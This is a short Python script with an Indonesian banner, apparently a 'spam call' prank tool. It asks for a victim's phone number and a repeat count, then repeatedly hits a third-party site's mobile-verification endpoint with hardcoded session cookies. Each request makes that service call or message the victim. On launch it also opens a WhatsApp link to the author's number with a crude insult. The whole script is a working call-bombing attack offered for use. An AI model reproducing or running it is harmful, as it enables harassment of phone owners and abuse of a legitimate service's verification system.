import requests,json,os,time


os.system("clear")
os.system("xdg-open https://wa.me/6281332690353?text=muka+lu+kek+komtol")
banner = """
        ----------------
• • • •\t[spam Call v0.1]
•\t----------------
--------------------------------,
'[| [•] creator : KHAIRIL A.F ♡|]
'[| [•] facebook : Sultan dana |]
'[| [•] Whatsapp : 081332690353|]
--------------------------------'

                     ______________
                ,===:.,            `-._
                `:.`---.__         `-._
                  `:.     `--.         `.
                  `:.     `--.         `.
            (,,(,    \.         `.   ____,-`.,
         (,      `/   \.   ,--.___`.
     ,  ,  ,--.   `,   \. ;`
      `{D,{     \  :    \ ;
        V,,     /  /    //
        j;;    /  ,  ,-//.    ,---.       
        \;    /  ,  /  _  \  /  _  \   , /
              \   `   / \  `   / \  `.  /
               `.___,/   `.__,/   `.__,/

 SPAM CALL BY KOMTOL KH4IR1L

 WARNING : TOLS INI HANYA UNTUK ORANG GABUT AJA KOMTOL

--- HANYA UNTUK MENJAHILI TEMAN KETIKA MAIN GAME ---
"""
print(banner)
nomor = input("nomor yang mau lu siksa contoh 8133x : ")
jumlah = int(input("[•] jumlah minimal 1x sehari : "))

ua = {
"Host":"id.jagreward.com",
"Connection":"keep-alive",
"Accept":"*/*",
"User-Agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36",
"X-Requested-With":"XMLHttpRequest",
"Sec-Fetch-Site":"same-origin",
"Sec-Fetch-Mode":"cors",
"Sec-Fetch-Dest":"empty",
"Referer":"https://id.jagreward.com/member/register/",
"Accept-Encoding":"gzip, deflate, br",
"Accept-Language":"id-US,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,en;q=0.6,tr;q=0.5,ml;q=0.4,zh-CN;q=0.3,zh;q=0.2,ms;q=0.1",
'Cookie':'PHPSESSID=3hqgrc01r1lt695h3mbc89aut1; _ga=GA1.3.1562005693.1615270165; DAPROPS="sjs.webGlRenderer:Adreno (TM) 306|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdeviceAspectRatio:9/16|sdevicePixelRatio:2|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0"; _gid=GA1.3.937703377.1615803297; _gat=1'
}
url = f"https://id.jagreward.com/member/verify-mobile/{nomor}/"
for i in range(int(jumlah)):
  req = requests.get(url,headers=ua).text
  sanz = json.loads(req)
  xn = sanz["result"]
  xx = sanz["message"]
  print(f"Result: {xn,},message: {xx}")
  time.sleep(5)


